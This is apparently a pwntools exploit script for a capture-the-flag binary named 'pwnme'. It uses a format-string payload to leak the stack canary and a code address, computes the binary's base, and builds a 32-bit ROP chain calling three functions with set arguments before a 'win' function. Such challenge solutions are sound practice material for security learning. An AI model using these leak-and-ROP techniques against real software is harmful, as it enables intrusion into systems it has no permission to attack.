from pwn import *
import re
p=process("./pwnme")
#p=remote("0.cloud.chals.io",20646)
elf=ELF("./pwnme")
resp1=p.recvrepeat(.1)
print(resp1)
p.sendline(b"%19$p ** %23$p @@")
resp=p.recvrepeat(.1)
canary = int(re.findall(b"[0-9a-f]{6,8}",resp)[0],16)
leak = int(re.findall(b"[0-9a-f]{6,8}",resp)[1],16)
print(hex(leak))
print(hex(canary))
elf.address = leak - 1082 - 0x1000
print(hex(elf.address))
cleaner = elf.address + 0x1022
arg1=0x1337
arg2=0xcafef00d
arg3=0xd00df00d
payload=b"A"*0x18 + p32(canary) + b"A"*12 + p32(elf.sym.func1) + p32(cleaner) + p32(arg1) +p32(elf.sym.func2) + p32(cleaner) + p32(arg2) +p32(elf.sym.func3) + p32(cleaner) + p32(arg3) + p32(elf.sym.win)
#p.sendline(payload)
#p.interactive()
